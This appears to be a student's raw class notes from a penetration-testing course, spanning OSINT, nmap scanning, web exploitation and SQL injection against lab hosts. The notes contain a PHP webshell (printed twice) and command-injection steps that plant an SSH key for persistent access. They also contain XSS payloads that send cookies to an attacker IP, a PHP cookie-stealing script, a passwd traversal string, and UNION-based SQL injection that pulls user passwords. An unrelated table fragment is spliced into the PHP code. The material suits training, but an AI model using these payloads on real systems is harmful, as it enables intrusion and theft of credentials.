grey host 10.50.41.117



ctxBvVwnguAb8vx


GOOGLE 


put - . in ""

can use AND and OR in statemates

MITRE CVE
-list of vunerabilities

exploitdb
-exploit database

search site: <website>


IMPORTANT
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
<HTML><BODY>
  2 <FORM METHOD="GET" NAME="myform" ACTION="">
  3 <INPUT TYPE="text" NAME="cmd">
  4 <INPUT TYPE="submit" VALUE="Send">
  5 </FORM>
  6 <pre>
  7 <?php
  8 if ($_GET['cmd']) {
  9     system($_GET['cmd']);
 10 }
 -shell
 
 Command Injection
 -using the websites native box to run commands


-on linops 
 ssh-keygen -t rsa -b 4096
where, passphrase default
will save to ~/.ssh/id_rsa.pub id_rsa

go to key directory

cat public key

-on webshell or command injection

;mkdir /var/www/.ssh
;ls -la /var/www

;echo "<public key>" > /var/www/.ssh/authorized_keys

-on linops

ssh -i .ssh/id_rsa www-data@10.50.37.95

DAY 1 PENETRAION TESTING
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------


op-notes
-techical informationÂ 
-your own notes
-raw jargon

Formalized Reports
-written for anyone to understand
-breif higher ups


VULNERABILITIES AND EXPLOITATION


Initial Access
-phisihing is the most comman initial access

Phishing 
-targeting anyone

Spear Phising 
-targets a group


EXPLOIT RESEARCH

Open source
-multiple sources
-vet everything

Organizational capabilities

Exploitation
-more passive 
-usually assisting a main purpose

Attack
-like kinetic war 



TESTING
Exploit Development occurs from vulnerability pairing and mission-drivens requirement

Test and verify success

Testing provides a number of benefits:

Faster time to breakout of initial foothold

Reduced risk of detection and/or tool failure

Improved recovery times


Plan a Procedured



SCANNING AND RECONAISSANCE

DoD States:
"produced from publicly available information that is collected, exploited, and disseminated in a timely manner to an appropriate audience for addressing a specific intelligence requirement."
-cannot do OSINT whenever you want
-has to fit specific mission scope
-use legal team to knows laws for collecting in that counrty

NOFORN = sources and methods 


Deep Web
-unlisted web pages like banks accounts 

Dark Web
-does not use normal web browser




HTML

-view source code 







pip install lxml requests

#!/usr/bin/python
import lxml.html
import requests

page = requests.get('http://quotes.toscrape.com')
tree = lxml.html.fromstring(page.content)

authors = tree.xpath('//small[@class="author"]/text()')

print ('Authors: ',authors)




SCANNING TECHNIQUES

-annotate any creds and ports running ssh
-annotate on map

nmap -Pn -T4 --min-rate 265465431 10.50.37.95 -p 22,80,8080,8888,2222,4444

for i in {1..254}; do (ping -c 1 192.168.1.$i | grep "bytes from" &); done

nmap -Pn -T4 --min-rate 265465431 10.50.37.95 -p 22,80 --script=smb-os-discovery.nse

Banner Grabbing
nmap -Pn -T4 --min-rate 265465431 10.50.37.95 -p 22,80 --script=banner.nse
nmap -Pn -T4 --min-rate 265465431 10.50.37.95 -p 22,80 --script=http-enum.nse



/usr/share/nmap/scripts



DAY 2 WEB EXPLOITATION
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

HTTP METHODS

GET

POST

HEAD

PUT

https://tools.ietf.org/html/rfc2616

RESPONSE CODES


10X == Informational

2XX == Success

30X == Redirection

4XX == Client Error

5XX == Server Error

https://tools.ietf.org/html/rfc2616

FIELDS

User-Agent

Referer

Cookie

Date

Server

Set-Cookie


https://www.columbiacountyga.gov/Home/Components/JobPosts/Job/1/1
/something.php?var=hi
-notes for using GET


ROBOTS.TXT

Legitimate surfing

Tools:

NSE scripts(nmap)

Nikto

Burp suite (outside class)


nikto -host 10.50.37.95


<script>alert("VULN XXS")<script>
-gives a popup on the page



<script>document.location="http://10.50.32.237:8000/+document.cookie;<script>
-redirects cookies to your ip


python3 -m http.server
-stars an http server 

<script>document.location="http://10.50.37.95/uploads/cookie.php username="+document.cookie;<script>



<?php
$cookie = $_GET["username"]	REASON
REVOKED	REVOKE
EFF DATE
MMB	20210722	00000000	00000000	
$steal = fopen("/var/www/html/uploads/cookiefile.txt", "a+");
fwrite($steal, $cookie ."\n");
fclose($steal);
?>



<HTML><BODY>
  2 <FORM METHOD="GET" NAME="myform" ACTION="">
  3 <INPUT TYPE="text" NAME="cmd">
  4 <INPUT TYPE="submit" VALUE="Send">
  5 </FORM>
  6 <pre>
  7 <?php
  8 if ($_GET['cmd']) {
  9     system($_GET['cmd']);
 10 }

-webshell


file traversal
../../../../../../etc/passwd
-adjust how many files back it could be




DAY 3 SQL INJECTION
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

mysql
-starts sql

show databases;
-show data

show tables from session;
-show specific table from database

select * from session.Tires;
-select everything from a session

select tireid,name,cost from seesion.Tires;
-shows specific columns from session

use session;
-go into session
  select * from Tires;
  

-character entries are in quotes by default and can be broken by adding your own quotes

User' OR '1=1

http://10.50.42.112/uniondemo.php?Selection=2 UNION select 1,2,3
-find feilds available abd what order they display

Selection=2 UNION select table_schema,column_name,table_name from information_schema.columns

User guide .columns in reasouce

Selection=2 UNION select name,type,cost from session.car;#

Selection=2 UNION select id,pass,name from session.user;#






